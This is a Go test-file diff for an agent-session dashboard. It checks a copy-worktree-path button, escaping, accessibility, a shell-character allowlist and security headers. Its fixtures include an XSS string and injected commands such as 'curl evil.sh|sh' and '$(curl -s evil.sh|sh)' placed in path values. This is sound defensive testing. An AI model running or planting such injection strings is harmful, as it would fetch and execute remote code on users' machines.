@@ -12,6 +12,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode"
 )
 
 func TestRowClass(t *testing.T) {
@@ -86,6 +87,526 @@ func TestHandleDashboard_EscapesHTML(t *testing.T) {
 	}
 }
 
+// The roster's branch cell is a click-to-copy control for the session's worktree
+// path. These pin the three states that matter: a live session with a cwd, one
+// without, and the escaping of a hostile path.
+func TestHandleDashboard_RosterBranchCopiesCwd(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-copy", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, "1 live") {
+		t.Fatalf("expected a roster row to render (nothing to assert on otherwise):\n%s", body)
+	}
+	if !strings.Contains(body, `class="copycwd"`) {
+		t.Errorf("roster branch cell has no copy button:\n%s", body)
+	}
+	if !strings.Contains(body, `data-cwd="/home/me/wt/fix-71"`) {
+		t.Errorf("copy button does not carry the session cwd:\n%s", body)
+	}
+}
+
+func TestHandleDashboard_RosterBranchWithoutCwd(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
+		SessionID: "sess-nocwd", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, "1 live") {
+		t.Fatalf("expected a roster row to render:\n%s", body)
+	}
+	// The bare class name also appears in the page's CSS and JS, so match the
+	// rendered attribute.
+	if strings.Contains(body, `class="copycwd"`) {
+		t.Errorf("cwd-less row must not offer a copy button:\n%s", body)
+	}
+	if !strings.Contains(body, "fix-71") {
+		t.Errorf("branch name dropped along with the button:\n%s", body)
+	}
+}
+
+// The cwd reaches three separate attributes, so each is asserted on its own: a
+// whole-body scan would still pass if data-cwd escaped and title did not.
+func TestHandleDashboard_EscapesCwd(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: `/tmp/"><script>alert(1)</script>`,
+		SessionID: "sess-xss", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `class="copycwd"`) {
+		t.Fatalf("expected the copy button to render:\n%s", body)
+	}
+	if strings.Contains(body, "<script>alert(1)</script>") {
+		t.Errorf("cwd was not HTML-escaped:\n%s", body)
+	}
+	// Scope to the button's own tag: title and aria-label appear elsewhere on the
+	// page, and a whole-body search would happily match one of those instead.
+	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
+	if tag == "" {
+		t.Fatalf("could not isolate the copy button tag:\n%s", body)
+	}
+	// Each attribute must have closed at its own quote, with the cwd's own quote
+	// and angle brackets escaped inside it — that is what proves the value could
+	// not break out of that specific attribute.
+	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
+		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
+		if m == nil {
+			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
+			continue
+		}
+		if !strings.Contains(m[1], "&lt;script&gt;") {
+			t.Errorf("%s = %q, want the cwd's angle brackets escaped", attr, m[1])
+		}
+		if !strings.Contains(m[1], "&#34;") {
+			t.Errorf("%s = %q, want the cwd's double quote escaped", attr, m[1])
+		}
+	}
+}
+
+// The button carries the accessibility contract for the copy affordance: a name
+// of its own (it replaces its inner text for assistive tech), a decorative glyph
+// hidden from it, and a live region to announce into.
+func TestHandleDashboard_CopyButtonAccessibility(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-a11y", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `aria-label="fix-71 — copy worktree path /home/me/wt/fix-71"`) {
+		t.Errorf("copy button is missing its accessible name:\n%s", body)
+	}
+	if !strings.Contains(body, `<span class="copyicon" aria-hidden="true">`) {
+		t.Errorf("the ⧉ glyph must be hidden from assistive tech:\n%s", body)
+	}
+	if !strings.Contains(body, `id="ck-copystatus" class="ck-sr" role="status"`) {
+		t.Errorf("copy live region missing:\n%s", body)
+	}
+	// The path is on hover too — issue #71 asks for it explicitly.
+	if !strings.Contains(body, `title="/home/me/wt/fix-71"`) {
+		t.Errorf("copy button lost the hover title:\n%s", body)
+	}
+}
+
+// The ⧉ is transparent at rest, which makes the rules that bring it BACK
+// load-bearing rather than cosmetic. A keyboard copy never hovers, and a mouse
+// copy is routinely followed by the pointer leaving the row well inside the
+// 1.2s flash window — so if either flash class stops outranking the resting
+// opacity, the ✓/✗ confirmation goes silent for sighted users while every other
+// test here (which only asserts the glyph's markup and its colour classes) keeps
+// passing. Touch is the mirror case: with no hover to reveal on, the glyph is
+// the only thing marking the cell as a control, so it must stay visible there.
+func TestDashboardCopyIcon_TransparentAtRestButForcedBackWhenItMatters(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	body := getBody(t, db, "/")
+
+	if !regexp.MustCompile(`\.copyicon\s*\{[^}]*\bopacity:\s*0\b`).MatchString(body) {
+		t.Error(".copyicon lost its resting opacity: 0 — the glyph is back on every roster row")
+	}
+
+	var reveal string
+	for _, m := range regexp.MustCompile(`([^{}]*)\{\s*opacity:\s*1;\s*\}`).FindAllStringSubmatch(body, -1) {
+		reveal += m[1]
+	}
+	for _, sel := range []string{
+		"tr:hover .copyicon",               // pointer discoverability
+		".copycwd:focus-visible .copyicon", // keyboard discoverability
+		".copycwd.copied .copyicon",        // success confirmation
+		".copycwd.copyfail .copyicon",      // refused/failed copy
+	} {
+		if !strings.Contains(reveal, sel) {
+			t.Errorf("%q no longer forces the glyph visible; reveal selectors are: %q", sel, reveal)
+		}
+	}
+
+	if !regexp.MustCompile(`@media \(hover: none\)\s*\{\s*\.copyicon\s*\{[^}]*\bopacity:\s*1\b`).MatchString(body) {
+		t.Error("touch devices have no hover to reveal on; .copyicon must stay visible under @media (hover: none)")
+	}
+}
+
+// On a grouped row that HAS a copy button, "(cluster)" must live in the button's
+// own aria-label. A button's aria-label replaces its accessible name outright, so
+// a sibling span carrying the note is silent to anyone tabbing control-to-control
+// — and emitting both would make browse mode say it twice. Exactly one carrier.
+func TestHandleDashboard_ClusterSuffixComposesWithCopyButton(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	// Two live sessions on one (source_app, branch) make a cluster.
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-c1", EventType: "Stop", PayloadJSON: "{}"})
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-c2", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, "2 live") {
+		t.Fatalf("expected two roster rows to form a cluster:\n%s", body)
+	}
+	// The button's OWN accessible name, parallel to how (mid-rebase) is folded in.
+	want := `aria-label="fix-71 (cluster) — copy worktree path /home/me/wt/fix-71"`
+	if n := strings.Count(body, want); n != 2 {
+		t.Errorf("expected both grouped rows' buttons to be named %s, got %d, in:\n%s", want, n, body)
+	}
+	// ...and not ALSO in a sibling span, which would double the announcement.
+	if strings.Contains(body, `<span class="ck-sr"> (cluster)</span>`) {
+		t.Errorf("grouped row with a copy button must not also emit the sibling span:\n%s", body)
+	}
+	// Never a name on the cell itself: that would replace the button, not compose.
+	if strings.Contains(body, `<td class="branch" data-label="branch" aria-label`) {
+		t.Errorf("cluster suffix must not be an aria-label on the cell:\n%s", body)
+	}
+	if !strings.Contains(body, `class="copycwd"`) {
+		t.Errorf("grouped row lost its copy button:\n%s", body)
+	}
+	// The poller carries keyboard focus across its #content swap by matching the
+	// button's data-session, so a cluster — two sessions, one identical cwd — is
+	// exactly where a data-cwd key would land focus on the wrong row. The two
+	// buttons must therefore carry DISTINCT session keys, and row order inside a
+	// cluster is not stable between polls, so this is the only thing that keeps
+	// focus on the row the user was actually on.
+	keys := regexp.MustCompile(`data-session="([^"]*)"`).FindAllStringSubmatch(body, -1)
+	if len(keys) != 2 {
+		t.Fatalf("expected both clustered buttons to carry data-session, got %d, in:\n%s", len(keys), body)
+	}
+	if keys[0][1] == keys[1][1] || keys[0][1] == "" {
+		t.Errorf("clustered rows must carry distinct non-empty session keys, got %q and %q",
+			keys[0][1], keys[1][1])
+	}
+}
+
+// The mirror image: a grouped row with NO cwd has no button to carry the note, so
+// the visually-hidden sibling span stays its carrier. Both halves of the rule
+// have to hold, or one of them silently becomes the only case that works.
+func TestHandleDashboard_ClusterSuffixWithoutCopyButton(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
+		SessionID: "sess-n1", EventType: "Stop", PayloadJSON: "{}"})
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
+		SessionID: "sess-n2", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if strings.Contains(body, `class="copycwd"`) {
+		t.Fatalf("cwd-less rows must not render a copy button:\n%s", body)
+	}
+	if n := strings.Count(body, `<span class="ck-sr"> (cluster)</span>`); n != 2 {
+		t.Errorf("expected 2 sibling cluster spans on the button-less rows, got %d, in:\n%s", n, body)
+	}
+}
+
+// Mid-rebase state reaches the button's own name, since that name replaces the
+// 🚧 glyph's label for anyone who tabs to the control.
+func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Rebasing: true, Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-rebase", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `aria-label="fix-71 (mid-rebase) — copy worktree path /home/me/wt/fix-71"`) {
+		t.Errorf("mid-rebase state missing from the button label:\n%s", body)
+	}
+}
+
+// Control characters must never reach the copy target: html/template does not
+// escape a newline in an attribute value, so one would ride the clipboard into a
+// terminal as a command terminator. buildEvent strips them on the way in, which
+// is what this exercises end to end.
+//
+// Only the control characters are stripped — the pipe survives into the
+// attribute, deliberately, because | is legal in a directory name and removing
+// it would corrupt a real path. Nothing shell-active is ever copied all the
+// same: the client's allowlist refuses the whole value (see
+// TestDashboardCopyGuard_PathAllowlist, which pins this exact string).
+func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	raw := []byte(`{"session_id":"sess-ctrl","hook_event_name":"Stop","cwd":"/home/me/wt\ncurl evil.sh|sh\u0007\t"}`)
+	if err := insertEvent(db, buildEvent(raw, "myapp")); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
+	if m == nil {
+		t.Fatalf("expected a copy button to render:\n%s", body)
+	}
+	if got, want := m[1], "/home/me/wtcurl evil.sh|sh"; got != want {
+		t.Errorf("data-cwd = %q, want %q", got, want)
+	}
+	if strings.ContainsFunc(m[1], unicode.IsControl) {
+		t.Errorf("control character survived into data-cwd: %q", m[1])
+	}
+}
+
+// Rows written before ingest started stripping control characters are still in
+// the database, so the read path strips too. Inserting the Event DIRECTLY —
+// bypassing buildEvent — is the point: it is the only way to produce the legacy
+// shape, and the only thing that distinguishes this from the test above. All
+// three attributes the cwd reaches are checked, not just the copy target: the
+// client's copy guard defends the clipboard alone, so title and aria-label have
+// no second line of defence.
+func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
+		Cwd:       "/home/me/wt\ncurl evil.sh|sh\x07\t",
+		SessionID: "sess-legacy", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
+	if tag == "" {
+		t.Fatalf("expected a copy button to render:\n%s", body)
+	}
+	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
+		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
+		if m == nil {
+			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
+			continue
+		}
+		if strings.ContainsFunc(m[1], unicode.IsControl) {
+			t.Errorf("control character survived into %s: %q", attr, m[1])
+		}
+		if !strings.Contains(m[1], "/home/me/wtcurl evil.sh|sh") {
+			t.Errorf("%s = %q, want the cwd with only its control characters removed", attr, m[1])
+		}
+	}
+}
+
+// The read path re-applies the length cap as well as the control-character
+// strip. Both exist for the same rows — written before cwd had either — and an
+// oversized one would otherwise be rendered three times per roster row on every
+// render and every poll. Inserted directly, bypassing buildEvent, which is the
+// only way to produce the legacy shape.
+func TestHandleDashboard_LegacyOversizedCwdIsCappedOnRead(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	long := "/home/me/" + strings.Repeat("a", maxPathLen)
+	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: long,
+		SessionID: "sess-long", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
+	if m == nil {
+		t.Fatalf("expected a copy button to render:\n%s", body)
+	}
+	if n := len([]rune(m[1])); n != maxPathLen+1 { // +1 for the ellipsis truncate appends
+		t.Errorf("data-cwd is %d runes, want the %d-rune cap plus an ellipsis", n, maxPathLen)
+	}
+	// ...and the ellipsis is what makes the client's 'truncated' refusal fire.
+	if !strings.HasSuffix(m[1], "…") {
+		t.Errorf("capped cwd should end in an ellipsis, got %q", m[1][len(m[1])-8:])
+	}
+}
+
+// The scrub layer fails closed, so a real path segment shaped like a credential
+// comes back as «redacted» and the stored cwd is no longer a path. The server
+// still renders the row — the branch, the status, the hover title are all worth
+// showing — but the client must refuse to put that value on the clipboard rather
+// than hand over a directory that does not exist. This pins both halves the
+// server can see: the redacted value reaching the button, and the guard being
+// present in the script that reads it.
+func TestHandleDashboard_RedactedCwdIsRefusedByTheCopyGuard(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	raw := []byte(`{"session_id":"sess-red","hook_event_name":"Stop","cwd":"/home/me/wt/api-key=v1/fix-71"}`)
+	ev := buildEvent(raw, "myapp")
+	ev.TS = ts
+	if !strings.Contains(ev.Cwd, redacted) {
+		t.Fatalf("expected the scrub layer to redact this path shape, got %q", ev.Cwd)
+	}
+	if err := insertEvent(db, ev); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, redacted) {
+		t.Errorf("the redacted cwd should still render (the row is worth showing):\n%s", body)
+	}
+	// The refusal itself lives in the client, so what the server can assert is
+	// that the guard is shipped and wired into the click handler. All three
+	// branches are pinned, not just the one this row exercises: a simplification
+	// that dropped the ellipsis disjunct would let a truncated path be copied as
+	// a broken path with the suite still green. So are the three messages —
+	// their whole point is that each cause is described accurately.
+	for _, frag := range []string{
+		`function unusableReason(s) {`,
+		`if (s.indexOf('` + redacted + `') !== -1) return 'redacted';`,
+		`if (s.charAt(s.length - 1) === '…') return 'truncated';`,
+		`if (pathAllow.test(s)) return 'unsafe';`,
+		`var path = btn.getAttribute('data-cwd') || '';`,
+		`var why = ctrlChars.test(path) ? 'unsafe' : unusableReason(path);`,
+		`flash(btn, false, unusableMsg[why]);`,
+		`redacted: 'part of this path was redacted — not copied',`,
+		`truncated: 'this path was too long and got cut off — not copied',`,
+		`unsafe: 'this path contains shell characters — not copied'`,
+	} {
+		if !strings.Contains(body, frag) {
+			t.Errorf("copy guard fragment missing from the page: %s", frag)
+		}
+	}
+}
+
+// pathAllowJS is the copy guard's allowlist exactly as it appears inside
+// new RegExp('…') in dashboard.html, and pathAllowGo is the same pattern with
+// the JS string escaping undone. Go's regexp gives \p{L}/\p{M}/\p{N} the same
+// meaning JS does under /u, so compiling it here exercises the real character
+// class. Asserting the JS form is present in the page keeps the two in step: a
+// change to the template that this test does not follow fails it.
+const pathAllowJS = `[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]`
+
+var pathAllowGo = regexp.MustCompile(strings.ReplaceAll(pathAllowJS, `\\`, `\`))
+
+// The same, for the ES5 fallback the guard installs on an engine without
+// Unicode property escapes. It is pinned because it is the pattern those older
+// engines actually run: widening this class to quiet a false positive would
+// break the refusal on exactly the engines the fallback exists for, and nothing
+// else in the suite would notice. Only the \uXXXX escapes need translating.
+const pathAllowFallbackJS = `[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]`
+
+var pathAllowFallbackGo = regexp.MustCompile(strings.NewReplacer(
+	`\\u0080`, `\x{0080}`, `\\uFFFF`, `\x{FFFF}`).Replace(pathAllowFallbackJS))
+
+// The allowlist has to refuse everything a shell would act on, and it has to
+// stay out of the way of ordinary paths. The second half matters as much as the
+// first: refusing spaces or non-ASCII names would make the button useless on a
+// Mac or on anyone's non-English filesystem, which is a worse outcome than the
+// attack it defends against.
+func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
+	safe := []string{
+		"/home/me/wt/fix-71",
+		"/Users/me/Library/Application Support/Claude",      // spaces are ordinary
+		"/home/mé/Ünïcode/プロジェクト/仕事",                        // non-ASCII letters must copy
+		"/home/me/Δοκιμή/проект/מסמכים",                     // more scripts, incl. RTL
+		"/home/me/v1.2+build=3,rev:4@host~tmp/100%_done-ok", // every permitted punctuation mark
+		"/",
+	}
+	// Both patterns, always: the fallback is what pre-2018 engines run, and a
+	// divergence between the two is a hole that only opens on those engines.
+	pats := map[string]*regexp.Regexp{
+		"unicode property escapes": pathAllowGo,
+		"ES5 fallback":             pathAllowFallbackGo,
+	}
+	for which, re := range pats {
+		for _, p := range safe {
+			if re.MatchString(p) {
+				t.Errorf("%s allowlist refuses an ordinary path: %q (offending char %q)",
+					which, p, re.FindString(p))
+			}
+		}
+	}
+
+	unsafe := map[string]string{
+		"command substitution": "/home/me/proj$(curl -s evil.sh|sh)",
+		"backtick":             "/home/me/proj`id`",
+		"semicolon":            "/home/me/proj;id",
+		"pipe":                 "/home/me/wtcurl evil.sh|sh",
+		"ampersand":            "/home/me/proj&id",
+		"redirect out":         "/home/me/proj>out",
+		"redirect in":          "/home/me/proj<in",
+		"double quote":         `/home/me/pro"j`,
+		"single quote":         "/home/me/pro'j",
+		"backslash":            `/home/me/pro\j`,
+		"glob star":            "/home/me/proj*",
+		"glob question":        "/home/me/proj?",
+		"bracket":              "/home/me/pro[j]",
+		"brace":                "/home/me/pro{j}",
+		"history bang":         "/home/me/proj!",
+		"comment hash":         "/home/me/proj#x",
+		"newline":              "/home/me/proj\nid",
+	}
+	for which, re := range pats {
+		for name, p := range unsafe {
+			if !re.MatchString(p) {
+				t.Errorf("%s allowlist permits a shell-active path (%s): %q", which, name, p)
+			}
+		}
+	}
+}
+
+// The pattern the test above exercises must be the one the page actually ships.
+func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `new RegExp('`+pathAllowJS+`', 'u')`) {
+		t.Errorf("the page does not ship the allowlist this suite tests: %s", pathAllowJS)
+	}
+	if !strings.Contains(body, `new RegExp('`+pathAllowFallbackJS+`')`) {
+		t.Errorf("the page does not ship the fallback allowlist this suite tests: %s", pathAllowFallbackJS)
+	}
+}
+
+// Two ways the copy button can fail a keyboard user, both of which cost nothing
+// to keep pinned. The drag-selection guard must not run on keyboard activation
+// (Enter does not collapse a selection made earlier elsewhere, so a
+// document-wide guard would swallow the copy with no flash and no
+// announcement), and the poller must carry focus across its #content swap
+// rather than drop it to <body> mid-interaction. The refocus key is the session
+// id (a cluster shares one cwd, so a path key would restore to the wrong row)
+// and the focus call must pass preventScroll (rows move between polls, and
+// refocusing must not yank a viewport the user did not scroll).
+func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	body := getBody(t, db, "/")
+	for _, frag := range []string{
+		`if (ev.detail !== 0) {`,
+		`sel.containsNode(btn, true)`,
+		`function swapContent(html) {`,
+		`active.closest('#content .copycwd')`,
+		`var key = keep ? keep.getAttribute('data-session') : null;`,
+		`if (btns[i].getAttribute('data-session') === key) { btns[i].focus({ preventScroll: true }); return; }`,
+		`document.dispatchEvent(new CustomEvent('ch:contentswap'))`,
+		`document.addEventListener('ch:contentswap', unflash);`,
+		`swapContent(d.html);`,
+	} {
+		if !strings.Contains(body, frag) {
+			t.Errorf("copy-button a11y fragment missing from the page: %s", frag)
+		}
+	}
+}
+
+// The copy affordance is roster-only by design: the activity and recent-events
+// branch cells share branchcell, which must stay a plain <td>. A session-less
+// event lands in both of those tables but never on the roster.
+func TestHandleDashboard_NonRosterBranchCellsHaveNoCopyButton(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, "0 live") {
+		t.Fatalf("session-less event should not reach the roster:\n%s", body)
+	}
+	if !strings.Contains(body, "Activity (last 30 min)") || !strings.Contains(body, "Bash: git status") {
+		t.Fatalf("expected the activity and recent-events tables to render:\n%s", body)
+	}
+	if strings.Contains(body, `class="copycwd"`) {
+		t.Errorf("copy button leaked outside the roster:\n%s", body)
+	}
+}
+
 func TestHandleDashboard_RendersActivity(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
@@ -127,6 +648,63 @@ func TestHandleState_ReturnsSignatureAndHTML(t *testing.T) {
 	// The fragment is the dynamic region only — no surrounding page chrome.
 	if strings.Contains(resp.HTML, "<form") || strings.Contains(resp.HTML, "<script") {
 		t.Errorf("fragment leaked page chrome:\n%s", resp.HTML)
+	}
+	// The copy live region must stay OUTSIDE #content, which this fragment
+	// replaces wholesale. A re-created live region is a NEW region to assistive
+	// tech and its text is not announced — a silent, invisible regression.
+	if strings.Contains(resp.HTML, "ck-copystatus") {
+		t.Errorf("copy live region moved inside the swapped region:\n%s", resp.HTML)
+	}
+}
+
+// Both routes carry the hardening headers. The framing one has teeth: the
+// clipboard fallback used on a non-secure origin still copies inside a frame,
+// so a framed dashboard is a usable decoy.
+func TestHandlers_SetSecurityHeaders(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	now := time.Now().UTC().Format(time.RFC3339)
+	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", PayloadJSON: "{}"})
+
+	routes := map[string]func(http.ResponseWriter, *http.Request, *sql.DB, *ciCache){
+		"/":          handleDashboard,
+		"/api/state": handleState,
+	}
+	want := map[string]string{
+		"X-Frame-Options":         "DENY",
+		"X-Content-Type-Options":  "nosniff",
+		"Referrer-Policy":         "no-referrer",
+		"Content-Security-Policy": "frame-ancestors 'none'; base-uri 'none'; object-src 'none'",
+	}
+	for target, h := range routes {
+		rec := httptest.NewRecorder()
+		h(rec, httptest.NewRequest(http.MethodGet, target, nil), db, newCICache())
+		if rec.Code != http.StatusOK {
+			t.Fatalf("%s: status=%d", target, rec.Code)
+		}
+		for k, v := range want {
+			if got := rec.Header().Get(k); got != v {
+				t.Errorf("%s: %s = %q, want %q", target, k, got, v)
+			}
+		}
+	}
+
+	// The error path has to carry them too. http.Error writes the response, so a
+	// handler that set headers only after a successful query would ship its 500
+	// unframed — which is the response an attacker can most easily provoke.
+	closed, _ := openDB(filepath.Join(t.TempDir(), "closed.db"))
+	closed.Close()
+	for target, h := range routes {
+		rec := httptest.NewRecorder()
+		h(rec, httptest.NewRequest(http.MethodGet, target, nil), closed, newCICache())
+		if rec.Code != http.StatusInternalServerError {
+			t.Fatalf("%s: a closed DB should 500, got %d", target, rec.Code)
+		}
+		for k, v := range want {
+			if got := rec.Header().Get(k); got != v {
+				t.Errorf("%s (500): %s = %q, want %q", target, k, got, v)
+			}
+		}
 	}
 }
 
@@ -317,6 +895,39 @@ func TestViewSignature_TracksTmuxSession(t *testing.T) {
 	activityDiff.Activity = []SourceCount{{SourceApp: "myapp", TmuxSession: "beta", Count: 2}}
 	if viewSignature(base) == viewSignature(activityDiff) {
 		t.Error("signature unchanged after an activity tmux-session change")
+	}
+}
+
+func TestViewSignature_TracksCwd(t *testing.T) {
+	// The roster renders each session's cwd (the branch cell's copy target), so a
+	// session that moves worktrees must repaint — otherwise the board keeps
+	// handing out a stale path.
+	base := dashboardData{
+		Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/one", Status: statusWorking}},
+	}
+	moved := base
+	moved.Agents = []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/two", Status: statusWorking}}
+	if viewSignature(base) == viewSignature(moved) {
+		t.Error("signature unchanged after a roster cwd change")
+	}
+}
+
+// The specific collision the %q in viewSignature prevents. These fields are free
+// text and can contain the ":" that delimits them, so written unquoted one
+// field's tail masquerades as the next field's head and two genuinely different
+// rosters hash alike — a repaint that never happens, leaving a stale copy target
+// on the board. Reverting %q to %s makes exactly this test fail, which the
+// "some change is noticed" test above cannot do.
+func TestViewSignature_DelimiterCannotBeSmuggled(t *testing.T) {
+	// Branch "main:/w" + cwd "one" against branch "main" + cwd "/w:one". Both
+	// concatenate to the same "…main:/w:one…" once the ":" separating branch from
+	// cwd is indistinguishable from the ":" inside the data. Note the second
+	// path's separator is the delimiter itself — a "/" there would NOT collide,
+	// and the test would pass under %s too, i.e. prove nothing.
+	a := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main:/w", Cwd: "one", Status: statusWorking}}}
+	b := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w:one", Status: statusWorking}}}
+	if viewSignature(a) == viewSignature(b) {
+		t.Error("signature collides across a field boundary: a delimiter in the data is being read as the delimiter")
 	}
 }
 
